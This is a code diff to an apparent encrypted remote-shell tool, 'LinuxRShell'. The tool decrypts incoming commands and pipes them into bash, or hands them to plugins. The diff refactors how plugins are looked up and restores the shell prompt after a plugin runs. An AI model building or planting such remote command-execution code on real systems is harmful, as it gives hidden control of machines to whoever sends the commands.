@@ -30,8 +30,8 @@ class LinuxRShell:
         commandClasses = inspect.getmembers(plugins, inspect.isclass)
         commandClasses.pop(0)
         externalCommands = dict()
-        for className, commandObject in commandClasses:
-            externalCommands[str(commandObject)] = commandObject.linuxTarget
+        for className, commandClass in commandClasses:
+            externalCommands[commandClass.name()] = commandClass.linuxTarget
         return externalCommands
 
     def tryPlugin(self, commandLine):
@@ -56,8 +56,12 @@ class LinuxRShell:
             command = cipher.decrypt(ciphertext)
             if len(command) > 0:
                 # check if command is a plugin -- if so run plugin's linux target code
-                plugin = self.tryPlugin(command)
-                if not plugin:
+                plugin = self.tryPlugin(command.decode())
+                if plugin:
+                    # print new prompt
+                    bash.stdin.write(b'\n')
+                    bash.stdin.flush()
+                else:
                     # not a plugin -- send command to shell
                     bash.stdin.write(command)
                     bash.stdin.flush()
